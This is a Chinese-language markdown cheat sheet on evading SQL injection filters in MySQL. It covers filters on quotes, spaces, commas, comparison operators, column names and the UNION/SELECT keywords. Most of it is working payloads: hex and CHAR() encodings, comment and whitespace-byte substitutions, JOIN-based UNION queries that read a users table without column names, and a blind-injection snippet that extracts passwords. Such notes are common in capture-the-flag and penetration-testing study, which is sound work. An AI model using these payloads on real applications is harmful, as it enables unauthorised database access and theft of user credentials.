# SQL注入绕过

## 过滤引号
- 十六进制
```sql
SELECT * FROM users WHERE username = 0x637466;
```

- CHAR()函数
```sql
SELECT * FROM users WHERE username = CHAR(99, 116, 102);
```

## 过滤空格
- 注释
	- /**/
	- /\*something\*/
	- /\*! MySQL-specific code \*/
- 括号
```sql
UNION(SELECT(column)FROM(table));
```
- 等价字符

|编码|含义|
|---|---|
|09|Horizontal Tab|
|0A|New Line|
|0B|Vertical Tab|
|0C|New Page|
|0D|Carriage Return|
|A0|Non-breaking Space|
|20|Space|

## 过滤逗号

- JOIN（联表查询）

```sql
-1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b 
```

- LIMIT 1 OFFSET 0
- FROM x FOR y
	- mid(user() from 1 for 1)
	- substr(user() from 1 for 1)


## 过滤比较操作符
寻找等价操作符
[Comparison Functions and Operators官方文档](https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html)

|符号|1|
|--|--|
|大于(等于)|>、>=、GREATEST()|
|小于(等于)|<、<=、|

## 过滤字段名

```sql
select x.3 from (select * from (select 1)a JOIN (select 2)b JOIN (select 3)c union(select * from users))x;
```

## 过滤关键词
### UNION
- `/union\s+select/i`
	- UNION(SELECT)
	- UNION [ALL|DISTINCT] SELECT
	- UNION/\*!SELECT\*/
	- UNION/**/SELECT
	- UNION%A0SELECT
- `/union/i`
将联合查询注入转化为盲注

```sql
' AND (SELECT pass FROM users LIMIT 1)='secret
```

### SELECT
- `/SELECT\s+[A-Za-z\.]+\s+FROM/i`
- `/SELECT/i`